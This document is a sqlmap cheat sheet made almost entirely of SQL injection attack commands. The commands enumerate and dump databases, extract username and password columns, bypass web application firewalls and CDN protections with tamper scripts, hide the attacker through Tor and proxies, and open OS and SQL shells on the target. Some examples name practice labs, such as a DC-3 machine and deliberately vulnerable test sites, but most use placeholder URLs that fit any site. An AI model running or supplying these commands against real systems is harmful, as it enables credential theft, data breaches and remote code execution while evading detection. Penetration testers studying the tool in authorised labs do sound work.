#Basic Scanning
sqlmap -u "$URL" --dbs 
sqlmap -u "$URL" -D "$DATABASE" --tables 
sqlmap -u "$URL" -D "$DATABASE" -T "$TABLE" --columns  
sqlmap -u "$URL" -D "$DATABASE" -T "$TABLE" --dump
sqlmap -u "$URL" -D "$DATABASE" -T "$TABLE" -C "$COLUMN" --dump 
sqlmap -u "$URL" -D "$DATABASE" -T "$TABLE" -C "uname,pass" --dump
sqlmap -u "$URL" -D "$DATABASE" --dump-all  
#Specify rdbms, risk level, batch, random-agent, https ssl, WAF or encoding issues bypass, behind Cloudflare or Akamai bypass alltogether
sqlmap -u "$URL"  --dbms=mysql --risk=3 --level=5  --random-agent --batch --force-ssl --tamper=between,randomcase,space2comment,charencode --delay=1 --timeout=10 --dbs

#add Cookies when authentication or POST or 403 or 401
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --cookie="login=test%2Ftest" --dbs  
--------------------------------------------
#Burp request
sqlmap -r request.txt --batch  #HTTP  
sqlmap -r request.txt --batch --force-ssl  # HTTPS  
sqlmap -r request.txt -p email --level=5 --risk=3 --batch --threads=10 --dbs  #Only to Email param
POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

email=user@example.com&password=123456
--------------------------------------------
#Target: DC-3 Machine
sqlmap -u "http://10.0.2.22/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]  
sqlmap -u "http://10.0.2.22/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomladb --tables  
sqlmap -u "http://10.0.2.22/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomladb --tables -T '#__users' -C name,password --dump  
--------------------------------------------
# Exploiting Parameters in URIs
sqlmap --dbms=mysql -u "http://example.domain/param1/value1*/param2/value2" --dbs --random-agent --batch
# Exploiting Specific Parameters
sqlmap --dbms=mysql -u "http://www.example.com/param1=value1&param2=value2" --dbs -p param2 --random-agent --batch
## POST Data Injection
sqlmap -u "http://example.domain/" --data='param1=blah&param2=blah' --cookie='JSESSIONID=d02084cbe50e16aa4' --level=5 --risk=3 -p param1 --random-agent --batch
--------------------------------------------
#Testing SQL Injection via POST with Response Matching
sqlmap -u "http://10.10.10.73/login.php" --dbms=MySQL --method=POST --data="username=x&password=y" --random-agent --risk=3 --level=5 -p username --text-only --string "Wrong identification : admin" --batch
--------------------------------------------
#Proxy & Anonymity
sqlmap --tor --tor-type=SOCKS5 --check-tor --dbms=mysql -u "$URL" --dbs  
sqlmap -u "http://example.domain/" --proxy=http://proxy_address:port  
sqlmap -u "http://example.domain/" --data="param1=value1&param2=value2" -p param1 --auth-type=[basic/ntlm] --auth-cred=username:password  
--------------------------------------------
#Domain-based SQL Injection
sqlmap -u "http://192.168.60.138" --forms --risk=3 --level=3 --batch #Enumerate Parameters First
sqlmap -u "http://192.168.60.138?param=value" -p param --risk=3 --level=3 --dbs
sqlmap -u "http://192.168.60.138/login.php" --data="username=admin&password=123" --dbms=MySQL --risk=3 --level=3 --dbs
--------------------------------------------
#Shell Access
sqlmap --dbms=mysql -u "$URL" --os-shell  
sqlmap --dbms=mysql -u "$URL" --sql-shell  
sqlmap --dbms=mysql -u "$URL" -D "$DATABASE" --sql-query "SELECT * FROM $TABLE;"  
sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=1jwuydl=; ui-tabs-1=0" --os-shell
TASKLIST
help
--------------------------------------------
#SQL Shell Queries
sql-shell> current_user()  
sql-shell> user()  
sql-shell> database()  
sql-shell> select table_name from information_schema.tables where table_schema='owasp10'  
